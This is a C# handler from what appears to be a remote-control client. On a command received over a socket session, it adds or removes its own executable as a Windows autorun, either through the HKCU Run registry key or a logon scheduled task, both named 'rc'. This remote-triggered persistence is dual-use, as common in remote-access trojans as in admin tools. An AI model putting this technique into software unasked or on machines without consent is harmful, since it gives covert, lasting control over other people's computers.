using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestAutoRunHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RequestAutoRun req = reqObj as RequestAutoRun;

            ResponseAutoRun resp = new ResponseAutoRun();
            try
            {
                if (req.AutoRunMode == eAutoRunMode.ByRegistry)
                {
                    RequestOpeRegistryValueName reqOpeRegistry = new RequestOpeRegistryValueName();
                    reqOpeRegistry.KeyRoot = eRegistryHive.CurrentUser;
                    reqOpeRegistry.KeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
                    reqOpeRegistry.ValueName = "rc";
                    if (req.OperationMode == OpeType.New)
                    {
                        reqOpeRegistry.Operation = OpeType.New;
                        reqOpeRegistry.Value = CommonUtil.GetEntryExecutablePath();
                    }
                    else if (req.OperationMode == OpeType.Delete)
                    {
                        reqOpeRegistry.Operation = OpeType.Delete;
                    }
                    else
                    {
                        return;
                    }
                    RequestOpeRegistryValueNameHandler.OpeRegistry(reqOpeRegistry);
                }
                else if (req.AutoRunMode == eAutoRunMode.BySchedualTask)
                {
                    SchTaskUtil.DeleteSchedule("rc");
                    if (req.OperationMode == OpeType.New)
                    {
                        SchTaskUtil.CreateScheduleOnLogon("rc", CommonUtil.GetEntryExecutablePath());
                    }
                }
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_AUTORUN_RESPONSE, resp);
        }
    }
}
